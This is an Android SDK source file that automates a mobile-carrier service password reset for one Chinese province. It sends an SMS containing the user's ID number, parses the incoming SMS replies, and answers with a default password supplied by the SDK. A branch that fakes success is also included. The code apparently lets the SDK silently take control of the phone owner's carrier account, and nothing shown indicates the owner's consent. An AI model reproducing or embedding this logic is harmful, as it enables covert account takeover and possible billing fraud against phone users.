package com.myyj.sdk.tools.pwdhelperx;

import android.util.Log;

import com.myyj.sdk.MySDK;
import com.myyj.sdk.ResultCallback;
import com.myyj.sdk.tools.LogHelper;

import static com.myyj.sdk.msdk.isRpwSkip;


class RPWHeiLongJiang extends RPWBase {
    public RPWHeiLongJiang(String phoneNumber, String idNumber, ResultCallback callback) {
        super(phoneNumber, idNumber, callback);
    }

    private final static int DYN_BIT_LEN = 6;
    private String tmpAddress = "";

    public void updateStatusLogic() {
        if(resetStatus == RS_START) {
            if(!isRpwSkip())
            {
                sendMsg(CM_ADDRESS, "CZMM#" + getIdNumber() + "#");
            }else{
                sendMsg(CM_ADDRESS, "CZMM#" + getIdNumber() + "#", new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if(state == 0) {
                            tmpAddress = "10086069";
                            changeStateIfTimeout(RS_SENDED_1, RS_RECEIVED_1);
                        }
                    }
                });
            }

            updateStatus(RS_SENDED_1);
            finishStatus = FS_FAIL_ID;
            serverPassword = "";
            startTimer(TIMEOUT_VALUE, RS_FINISH);
        }
        else if(resetStatus == RS_FINISH) {
            finish(finishStatus);
        }
        else if(resetStatus == RS_RECEIVED_1) {
            if(!isRpwSkip())
            {
                sendMsg(tmpAddress, "#" + MySDK.getInstance().getDefaultServicePassword() + "#" + MySDK.getInstance().getDefaultServicePassword() + "#");
            }else{
                sendMsg(tmpAddress, "#" + MySDK.getInstance().getDefaultServicePassword() + "#" + MySDK.getInstance().getDefaultServicePassword() + "#", new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if(state == 0) {
                            serverPassword = MySDK.getInstance().getDefaultServicePassword();
                            changeStateIfTimeout(RS_SENDED_2, RS_FINISH);
                        }
                    }
                });
            }

            serverPassword = MySDK.getInstance().getDefaultServicePassword();
            finishStatus = FS_SUC;
            this.updateStatus(RS_FINISH);
        }
    }

    public void updateReceiveLogic(String address, String body) {
        if(resetStatus == RS_SENDED_1) {
            if (address.equals(CM_ADDRESS)) {
                return;
            } else if (checkStrContainsKeyWords(body, new String[]{"失败", "不成功"})) {
                stopTimer();
                finishStatus = FS_FAIL_ID;
                this.updateStatus(RS_FINISH);
            } else if (checkStrContainsKeyWords(body, new String[]{"新密码", "格式"})) {
                stopTimer();
                tmpAddress = address;
                this.updateStatus(RS_RECEIVED_1);
            }
        }
    }

    @Override
    protected String getFirstSMS() {
        return "CZMM#"+getIdNumber()+"#";
    }

    @Override
    protected boolean needIdCardNumberAtFirst() {
        return super.needIdCardNumberAtFirst();
    }
}
